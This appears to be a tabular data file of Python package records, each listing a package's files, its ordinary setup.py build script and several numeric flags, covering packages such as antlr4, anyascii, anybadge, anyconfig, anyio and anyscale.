        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
    )
}

setup(name='antchain_alipay_util', **setup_args)
",1
antlr4-python2-runtime-4.10.1,0,1,1,1,0,0,1,0,MANIFEST.in PKG-INFO README.txt RELEASE-4.5.txt setup.cfg setup.py ATN.py ATNConfig.py ATNConfigSet.py ATNDeserializationOptions.py ATNDeserializer.py ATNSimulator.py ATNState.py ATNType.py LexerAction.py LexerActionExecutor.py LexerATNSimulator.py ParserATNSimulator.py PredictionMode.py SemanticContext.py Transition.py __init__.py BufferedTokenStream.py CodePoints.py CommonTokenFactory.py CommonTokenStream.py DFA.py DFASerializer.py DFAState.py __init__.py DiagnosticErrorListener.py ErrorListener.py Errors.py ErrorStrategy.py __init__.py FileStream.py InputStream.py IntervalSet.py Lexer.py ListTokenSource.py LL1Analyzer.py Parser.py ParserInterpreter.py ParserRuleContext.py PredictionContext.py Recognizer.py RuleContext.py StdinStream.py Token.py TokenStreamRewriter.py Chunk.py ParseTreeMatch.py ParseTreePattern.py ParseTreePatternMatcher.py RuleTagToken.py TokenTagToken.py Tree.py Trees.py __init__.py Utils.py XPath.py XPathLexer.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from setuptools import setup

v = '4.10.1'
setup(
    name='antlr4-python2-runtime',
    version=v,
    url='http://www.antlr.org',
    license='BSD',
    packages=['antlr4', 'antlr4.atn', 'antlr4.dfa', 'antlr4.tree', 'antlr4.error', 'antlr4.xpath'],
    package_dir={'': 'src'},
    author='Eric Vergnaud, Terence Parr, Sam Harwell',
    author_email='eric.vergnaud@wanadoo.fr',
    description=f'ANTLR {v} runtime for Python 2.7.12'
)",1
antlr4-python3-runtime-4.10,0,1,1,1,0,0,1,0,MANIFEST.in PKG-INFO README.txt RELEASE-4.5.txt setup.cfg setup.py ATN.py ATNConfig.py ATNConfigSet.py ATNDeserializationOptions.py ATNDeserializer.py ATNSimulator.py ATNState.py ATNType.py LexerAction.py LexerActionExecutor.py LexerATNSimulator.py ParserATNSimulator.py PredictionMode.py SemanticContext.py Transition.py __init__.py BufferedTokenStream.py CommonTokenFactory.py CommonTokenStream.py DFA.py DFASerializer.py DFAState.py __init__.py DiagnosticErrorListener.py ErrorListener.py Errors.py ErrorStrategy.py __init__.py FileStream.py InputStream.py IntervalSet.py Lexer.py ListTokenSource.py LL1Analyzer.py Parser.py ParserInterpreter.py ParserRuleContext.py PredictionContext.py Recognizer.py RuleContext.py StdinStream.py Token.py TokenStreamRewriter.py Chunk.py ParseTreeMatch.py ParseTreePattern.py ParseTreePatternMatcher.py RuleTagToken.py TokenTagToken.py Tree.py Trees.py __init__.py Utils.py XPath.py XPathLexer.py __init__.py _pygrun.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"from setuptools import setup

v = '4.10'

setup(
    name='antlr4-python3-runtime',
    version=v,
    packages=['antlr4', 'antlr4.atn', 'antlr4.dfa', 'antlr4.tree', 'antlr4.error', 'antlr4.xpath'],
    package_dir={'': 'src'},
    install_requires=[
        ""typing ; python_version<'3.5'"",
    ],
    url='http://www.antlr.org',
    license='BSD',
    author='Eric Vergnaud, Terence Parr, Sam Harwell',
    author_email='eric.vergnaud@wanadoo.fr',
    entry_points={'console_scripts': ['pygrun=antlr4._pygrun:main']},
    description=f'ANTLR {v} runtime for Python 2.7.12'
)
",1
anyascii-0.3.1,0,1,1,1,1,0,1,0,000 001 002 003 004 005 006 007 008 009 00a 00b 00c 00d 00e 00f 010 011 012 013 014 015 016 017 018 019 01a 01b 01c 01d 01e 01f 020 021 022 023 024 025 026 027 028 029 02a 02b 02c 02d 02e 02f 030 031 032 033 034 035 036 037 038 039 03a 03b 03c 03d 03e 03f 040 041 042 043 044 045 046 047 048 049 04a 04b 04c 04d 04e 04f 050 051 052 053 054 055 056 057 058 059 05a 05b 05c 05d 05e 05f 060 061 062 063 064 065 066 067 068 069 06a 06b 06c 06d 06e 06f 070 071 072 073 074 075 076 077 078 079 07a 07b 07c 07d 07e 07f 080 081 082 083 084 085 086 087 088 089 08a 08b 08c 08d 08e 08f 090 091 092 093 094 095 096 097 098 099 09a 09b 09c 09d 09e 09f 0a0 0a1 0a2 0a3 0a4 0a5 0a6 0a7 0a8 0a9 0aa 0ab 0ac 0ad 0ae 0af 0b0 0b1 0b2 0b3 0b4 0b5 0b6 0b7 0b8 0b9 0ba 0bb 0bc 0bd 0be 0bf 0c0 0c1 0c2 0c3 0c4 0c5 0c6 0c7 0c8 0c9 0ca 0cb 0cc 0cd 0ce 0cf 0d0 0d1 0d2 0d3 0d4 0d5 0d6 0d7 0f9 0fa 0fb 0fc 0fd 0fe 0ff 100 101 102 103 104 105 106 107 108 109 10a 10b 10c 10d 10e 10f 110 111 112 113 114 115 116 117 118 119 11a 11c 11d 11e 11f 124 12f 130 131 132 133 134 144 145 146 16a 16b 16e 16f 170 171 172 173 174 175 176 177 178 179 17a 17b 17c 17d 17e 17f 180 181 182 183 184 185 186 187 188 189 18a 18b 18c 18d 1b0 1b1 1b2 1bc 1cf 1d0 1d1 1d2 1d3 1d4 1d5 1d6 1d7 1df 1e0 1e1 1e2 1e7 1e8 1e9 1ec 1ed 1ee 1f0 1f1 1f2 1f3 1f4 1f5 1f6 1f7 1f8 1f9 1fa 1fb 200 201 202 203 204 205 206 207 208 209 20a 20b 20c 20d 20e 20f 210 211 212 213 214 215 216 217 218 219 21a 21b 21c 21d 21e 21f 220 221 222 223 224 225 226 227 228 229 22a 22b 22c 22d 22e 22f 230 231 232 233 234 235 236 237 238 239 23a 23b 23c 23d 23e 23f 240 241 242 243 244 245 246 247 248 249 24a 24b 24c 24d 24e 24f 250 251 252 253 254 255 256 257 258 259 25a 25b 25c 25d 25e 25f 260 261 262 263 264 265 266 267 268 269 26a 26b 26c 26d 26e 26f 270 271 272 273 274 275 276 277 278 279 27a 27b 27c 27d 27e 27f 280 281 282 283 284 285 286 287 288 289 28a 28b 28c 28d 28e 28f 290 291 292 293 294 295 296 297 298 299 29a 29b 29c 29d 29e 29f 2a0 2a1 2a2 2a3 2a4 2a5 2a6 2a7 2a8 2a9 2aa 2ab 2ac 2ad 2ae 2af 2b0 2b1 2b2 2b3 2b4 2b5 2b6 2b7 2b8 2b9 2ba 2bb 2bc 2bd 2be 2bf 2c0 2c1 2c2 2c3 2c4 2c5 2c6 2c7 2c8 2c9 2ca 2cb 2cc 2cd 2ce 2cf 2d0 2d1 2d2 2d3 2d5 2d6 2d7 2d8 2d9 2da 2db 2dc 2dd 2de 2e0 2e1 2e2 2e3 2e4 2e5 2e6 2e7 2e8 2e9 2ea 2eb 2f8 2f9 2fa 300 301 302 303 304 305 306 307 308 309 30a 30b 30c 30d 30e 30f 310 311 312 313 e00 __init__.py __init__.py LICENSE PKG-INFO pyproject.toml README.md setup.py test_anyascii.py,"#!/usr/bin/env python
# setup.py generated by flit for tools that don't yet use PEP 517

from distutils.core import setup

packages = \
['anyascii', 'anyascii._data']

package_data = \
{'': ['*']}

setup(name='anyascii',
      version='0.3.1',
      description='Unicode to ASCII transliteration',
      author='Hunter WB',
      author_email='hunter@hunterwb.com',
      url='https://github.com/anyascii/anyascii',
      packages=packages,
      package_data=package_data,
      python_requires='>=3.3',
     )
",1
anybadge-1.12.0,0,1,1,1,1,0,1,0,badge.py cli.py colors.py config.py exceptions.py helpers.py cli.py config.py request_handler.py __init__.py styles.py default.svg gitlab_scoped.svg __init__.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt anybadge_server.py AUTHORS.rst LICENSE PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/python
import os
import re
from setuptools import setup

with open(""README.md"", encoding=""utf-8"") as f:
    long_description = f.read()

# Attempt to get version number from TravisCI environment variable
version = os.environ.get(""TRAVIS_TAG"", default=""0.0.0"")

# Remove leading 'v'
version = re.sub(""^v"", """", version)

setup(
    name=""anybadge"",
    description=""Simple, flexible badge generator for project badges."",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    version=version,
    author=""Jon Grace-Cox"",
    author_email=""jongracecox@gmail.com"",
    packages=[""anybadge"", ""anybadge.templates"", ""anybadge.server""],
    py_modules=[""anybadge_server""],
    setup_requires=[""setuptools"", ""wheel""],
    tests_require=[],
    install_requires=[""packaging""],
    package_data={""anybadge"": [""templates/*.svg""]},
    options={""bdist_wheel"": {""universal"": False}},
    python_requires="">=3.7"",
    url=""https://github.com/jongracecox/anybadge"",
    entry_points={
        ""console_scripts"": [
            ""anybadge=anybadge.cli:main"",
            ""anybadge-server=anybadge.server.cli:main"",
        ],
    },
    classifiers=[""License :: OSI Approved :: MIT License""],
)
",1
anyconfig-0.13.0,0,1,1,1,1,0,0,0,bug_report.md feature_request.md tests-in-centos.yml tests.yml .gitignore AUTHORS.txt anyconfig_cli.1 anyconfig.api.datatypes.rst anyconfig.api.rst anyconfig.api.utils.rst anyconfig.api._dump.rst anyconfig.api._load.rst anyconfig.api._open.rst anyconfig.backend.base.compat.rst anyconfig.backend.base.datatypes.rst anyconfig.backend.base.dumpers.rst anyconfig.backend.base.loaders.rst anyconfig.backend.base.parsers.rst anyconfig.backend.base.rst anyconfig.backend.base.utils.rst anyconfig.backend.ini.rst anyconfig.backend.json.common.rst anyconfig.backend.json.default.rst anyconfig.backend.json.rst anyconfig.backend.json.simplejson.rst anyconfig.backend.pickle.rst anyconfig.backend.properties.rst anyconfig.backend.rst anyconfig.backend.shellvars.rst anyconfig.backend.toml.rst anyconfig.backend.xml.rst anyconfig.backend.yaml.common.rst anyconfig.backend.yaml.pyyaml.rst anyconfig.backend.yaml.rst anyconfig.backend.yaml.ruamel_yaml.rst anyconfig.cli.rst anyconfig.common.datatypes.rst anyconfig.common.errors.rst anyconfig.common.rst anyconfig.dicts.rst anyconfig.ioinfo.constants.rst anyconfig.ioinfo.datatypes.rst anyconfig.ioinfo.detectors.rst anyconfig.ioinfo.factory.rst anyconfig.ioinfo.rst anyconfig.ioinfo.utils.rst anyconfig.models.processor.rst anyconfig.models.rst anyconfig.parser.rst anyconfig.parsers.parsers.rst anyconfig.parsers.rst anyconfig.parsers.utils.rst anyconfig.processors.datatypes.rst anyconfig.processors.processors.rst anyconfig.processors.rst anyconfig.processors.utils.rst anyconfig.query.datatypes.rst anyconfig.query.default.rst anyconfig.query.query.rst anyconfig.query.rst anyconfig.schema.datatypes.rst anyconfig.schema.default.rst anyconfig.schema.jsonschema.rst anyconfig.schema.rst anyconfig.template.jinja2.rst anyconfig.template.rst anyconfig.utils.detectors.rst anyconfig.utils.files.rst anyconfig.utils.lists.rst anyconfig.utils.rst anyconfig.utils.utils.rst index.rst cli.rst conf.py design.rst hacking.rst index.rst introduction.rst Makefile requirements.txt usage.rst LICENSE.MIT MANIFEST.in mypy.ini NEWS copr-build.sh gen-authors.sh gen-readme.sh header.rst nose.cfg package.spec.in scrutinizer.yml PKG-INFO README.rst requirements.txt requirements_min.txt setup.cfg setup.py datatypes.py utils.py _dump.py _load.py _open.py __init__.py compat.py datatypes.py dumpers.py loaders.py parsers.py utils.py __init__.py ini.py common.py default.py simplejson.py __init__.py pickle.py properties.py shellvars.py toml.py xml.py common.py pyyaml.py ruamel_yaml.py __init__.py __init__.py actions.py constants.py detectors.py filters.py io.py parse_args.py utils.py _main.py __init__.py datatypes.py errors.py __init__.py dicts.py constants.py datatypes.py detectors.py factory.py utils.py __init__.py processor.py __init__.py parser.py parsers.py utils.py __init__.py datatypes.py processors.py utils.py __init__.py py.typed datatypes.py default.py query.py __init__.py datatypes.py default.py jsonschema.py __init__.py singleton.py jinja2.py __init__.py detectors.py files.py lists.py utils.py __init__.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt common.py test_basics.py __init__.py common.py test_basics.py __init__.py common.py test_basics.py test_multi_types.py test_query.py test_schema.py test_templates.py __init__.py common.py test_basics.py test_query.py test_schema.py test_template.py __init__.py collector.py common.py datatypes.py test_basics.py test_collector.py test_common.py test_multi_types.py test_query.py test_schema.py test_template.py test_utils.py utils.py __init__.py common.py test_basics.py __init__.py common.py test_ac_parser.py test_basics.py test_common.py test_multi_types.py test_optional_types.py test_primitives.py test_query.py test_schema.py test_template.py __init__.py test_utils.py __init__.py test_dumpers.py test_loaders.py test_parsers.py test_utils.py __init__.py common.py constants.py test_default.py test_simplejson.py __init__.py test_ini.py test_pickle.py test_properties.py test_shellvars.py test_toml.py test_xml.py common.py test_pyyaml.py test_ruamel_yaml.py __init__.py __init__.py collector.py constants.py datatypes.py test_collector.py test_utils.py utils.py __init__.py collectors.py datatypes.py test_base.py test_detectors.py test_errors.py test_extra_options.py test_ignore_missing.py test_multi_inputs.py test_parse_args.py test_query.py test_schema.py test_show.py test_single_input.py test_single_input_to_yaml_output.py test_template.py __init__.py common.py common.py test_functions.py test_get.py test_merge.py test_mk_nested_dic.py __init__.py constants.py test_detectors.py test_factory.py test_utils.py __init__.py common.py test_attrlist.py test_attrlist_0.py test_list.py test_parse.py test_single.py __init__.py test_parsers.py test_utils.py __init__.py pip_install.bats common.py test_processors.py test_utils.py __init__.py test_query.py __init__.py requirements.txt requirements_plugins.txt requirements_type-check.txt 00-00-cnf.json 00-00-cnf_indented.json 00-01-cnf.json 00-02-cnf.json 00-cnf.json 00-cnf.yml 00-scm.json 00-template-ctx.yml 20-00-cnf.ini 20-00-cnf.json 20-00-cnf.properties 20-00-cnf.sh 20-00-cnf.toml 20-00-cnf.xml 20-00-cnf.yml 20-10-cnf.xml 30-00-cnf.json 30-00-template-cnf-ng-scm.json 30-00-template-cnf.json 30-10-template-cnf.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.py 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 10.json 10.json 10.json 10.json 20.json 30.json 40.json 50.json 10.json 20.json 30.json 40.json 50.json 10.json 20.json 30.json 40.json 50.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.json 30.json 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.xml 30.sh 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 10.json 10.json README.md 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json README.md 10.json 20.json 10.json 20.json 10.json 20.json README.md 10.json 10.json 10.json README.md 10.json 20.conf 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json README.md 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.json 30.yml 40.yml 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json README.md 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 00_primitives.json 10.json 10_primitives.json 10.json 20.json 10.json 20.json 10.py 20.py 10.py 20.py 00.json 10.json 100.json 110.json 20.json 30.json 40.json 50.json 60.json 70.json 80.json 90.json 00.json 10.json 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 00.py 10.py 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 00.py 10.py 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 10.json 20.json 30.json 10.py 20.json 30.json 10.txt 20.txt 30.txt 10.txt 20.txt 30.txt 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.py 20.py 10.json 20.json 10.json 20.json 10.py 20.py 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.ini 00.json 00.json 10.json 20.json 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.txt 20.txt 30.txt 40.txt 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.ini 20.json 30.json 40.properties 50.sh exp.json 00.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json exp.json 00.json 00.conf 10.conf 20.conf 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_schema_validation.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_explicit_parser_type_option.txt 10.ini 20.properties 10.json 20.json 10.sh 10.json 10.json 00.xml 10.xml 20.xml 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.py 20.py 30.py 40.py 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.j2 10.j2 20.j2 30.j2 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.toml 10.toml 20.toml 00.json 10.json 20.json 00.yml 10.yml 20.yml 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 20_00.txt 20_10.txt 20_20.txt 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.ini 20.json 30.json 40.properties 50.sh exp.json 00.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json exp.json 00.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 00.txt 10.txt 20.txt 30.txt 40.txt 00.json 10.py 20.py 30.py 40.py 00.txt 10.txt 20.txt 30.txt 40.txt 50.txt 00.json 10.json 20.json 30.json 40.json 50.json 00.json 10.json 20.json 30.json 40.json 50.json 00.py 10.txt 20.txt 30.txt 40.py 50.py 60.txt 70.txt 00.py 10.py 20.py 30.py 40.py 50.py 60.py 70.py 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 50.json 10.txt 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 00.py 10.txt 20.txt 30.txt 40.py 50.py 60.txt 70.txt 00.py 10.py 20.py 30.py 40.py 50.py 60.py 70.py 10.properties 10.json 10.sh 10.json 00.conf 10.conf 20.conf 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_schema_validation.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_explicit_parser_type_option.txt 10.ini 20.properties 10.json 20.json 10.sh 10.json 10.json 00.xml 10.xml 20.xml 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.py 20.py 30.py 40.py 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.j2 10.j2 20.j2 30.j2 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.toml 10.toml 20.toml 00.json 10.json 20.json 00.yml 10.yml 20.yml 00.json 10.json 20.json 10.j2 20.j2 10.txt 10.j2 10.txt 00.xml 10.xml 20.xml 00.json 10.json 20.json test_jsonschema.py __init__.py test_jinja2.py __init__.py test_lib.py test_singleton.py test_detectors.py test_files.py test_lists.py test_utils.py __init__.py __init__.py tox.ini,"""""""setup.py to build package.""""""
import os
import pathlib
import re
import setuptools
import setuptools.command.bdist_rpm


# It might throw IndexError and so on.
VERSION = '0.1.0'
VER_REG = re.compile(r""^__version__ = '([^']+)'"")

for fpath in pathlib.Path('src').glob('**/__init__.py'):
    for line in fpath.open():
        match = VER_REG.match(line)
        if match:
            VERSION = match.groups()[0]
            break

# For daily snapshot versioning mode:
RELEASE = ""1%{?dist}""
if os.environ.get(""_SNAPSHOT_BUILD"", None) is not None:
    import datetime
    RELEASE = RELEASE.replace('1',
                              datetime.datetime.now().strftime(""%Y%m%d""))


def _replace(line):
    """"""Replace some strings in the RPM SPEC template.""""""
    if ""@VERSION@"" in line:
        return line.replace(""@VERSION@"", VERSION)

    if ""@RELEASE@"" in line:
        return line.replace(""@RELEASE@"", RELEASE)

    if ""Source0:"" in line:  # Dirty hack
        return ""Source0: %{pkgname}-%{version}.tar.gz""

    return line


class bdist_rpm(setuptools.command.bdist_rpm.bdist_rpm):
    """"""Override the default content of the RPM SPEC.""""""

    spec_tmpl = pathlib.Path('pkg/package.spec.in').resolve()

    def _make_spec_file(self):
        """"""Generate the RPM SPEC file.""""""
        return [_replace(line.rstrip()) for line in self.spec_tmpl.open()]


setuptools.setup(version=VERSION, cmdclass=dict(bdist_rpm=bdist_rpm),
                 data_files=[(""share/man/man1"", [""docs/anyconfig_cli.1""])])

# vim:sw=4:ts=4:et:
",1
anyio-3.6.1,1,1,1,0,0,0,0,0,publish.yml test.yml .gitignore .pre-commit-config.yaml .readthedocs.yml api.rst basics.rst cancellation.rst conf.py contributing.rst faq.rst fileio.rst index.rst migration.rst networking.rst signals.rst streams.rst subprocesses.rst support.rst synchronization.rst tasks.rst testing.rst threads.rst typedattrs.rst versionhistory.rst LICENSE PKG-INFO pyproject.toml README.rst setup.cfg setup.py _resources.py _sockets.py _streams.py _subprocesses.py _tasks.py _testing.py __init__.py from_thread.py lowlevel.py py.typed pytest_plugin.py buffered.py file.py memory.py stapled.py text.py tls.py __init__.py to_process.py to_thread.py _asyncio.py _trio.py __init__.py _compat.py _eventloop.py _exceptions.py _fileio.py _resources.py _signals.py _sockets.py _streams.py _subprocesses.py _synchronization.py _tasks.py _testing.py _typedattr.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt conftest.py test_buffered.py test_file.py test_memory.py test_stapled.py test_text.py test_tls.py __init__.py test_compat.py test_debugging.py test_eventloop.py test_fileio.py test_from_thread.py test_lowlevel.py test_pytest_plugin.py test_signals.py test_sockets.py test_subprocesses.py test_synchronization.py test_taskgroups.py test_to_process.py test_to_thread.py __init__.py tox.ini,"from setuptools import setup

setup(use_scm_version=True, setup_requires=[""setuptools_scm""])
",1
an-0.3.3,0,1,1,1,0,0,1,0,,,1
anyscale-0.5.42,0,1,1,0,0,0,0,0,.covrc anyscale_schema.json api.py authenticate.py auth_proxy.py node_provider.py __init__.py command_runner.py example.yaml node_provider.py __init__.py node_provider.py __init__.py node_provided_cache.py node_provider.py __init__.py aws_iam_policies.py job_runner.py __init__.py cached_gcp_regions.json .gitignore .gitlab-ci.yml VERSION .openapi-generator-ignore .travis.yml git_push.sh default_api.py __init__.py api_client.py configuration.py exceptions.py actorlogs_response.py actor_lifetime.py actor_logs.py actor_status.py add_instance_pool_member.py anyscaleawsaccount_response.py anyscaledconfig_response.py anyscaledcredentialresponse_response.py anyscaleddataplaneconfig_response.py anyscaled_config.py anyscaled_credential_response.py anyscaled_dataplane_config.py anyscaleversionresponse_response.py anyscale_aws_account.py anyscale_version_response.py appconfig_response.py applied_snapshot.py app_config.py app_config_config_schema.py archivedlogsinfo_response.py archived_logs_info.py archive_status.py autoscalercredentials_response.py autoscaler_credentials.py autoscaler_report.py autoscaler_status.py autosyncsessionid_list_response.py autosyncsessionid_response.py autosync_session_id.py awsregionandzones_response.py aws_node_options.py aws_region_and_zones.py aws_region_info.py aws_tag.py aws_tag_specification.py bank_account_information.py baseimagesenum.py base_job_status.py batched_result_organization_invitation_base.py batch_response_batched_result_organization_invitation_base.py billing_information.py block_device_mapping.py build.py buildlogresponse_response.py build_log_response.py build_response.py build_status.py card.py card_id.py card_list_response.py change_password_params.py clone_experimental_workspace.py cloud.py cloudregionandzones_response.py cloud_config.py cloud_list_response.py cloud_name_options.py cloud_provider.py cloud_providers.py cloud_region_and_zones.py cloud_region_info.py cloud_response.py cloud_status.py cloud_types.py clusterconfigwithsessionidletimeout_response.py clusterconfig_response.py clusterfeatures_response.py clustermonitorresponse_response.py clusterstatus_response.py cluster_compute_config.py cluster_config.py cluster_config_with_session_idle_timeout.py cluster_features.py cluster_monitor_response.py cluster_status.py computetemplateconfig_response.py computetemplate_response.py compute_node_type.py compute_template.py compute_template_config.py compute_template_query.py create_app_config.py create_app_config_configuration_schema.py create_build.py create_compute_template.py create_cron_job.py create_experimental_workspace.py create_experimental_workspace_from_job.py create_from_github_options.py create_nodes_options.py create_organization_invitation.py create_production_job.py create_production_job_config.py create_production_service.py create_response.py create_session_from_snapshot_options.py create_session_in_db.py create_structured_output.py create_user.py create_user_project_collaborator.py create_user_project_collaborator_value.py credit_card_information.py decoratedactor_list_response.py decoratedactor_response.py 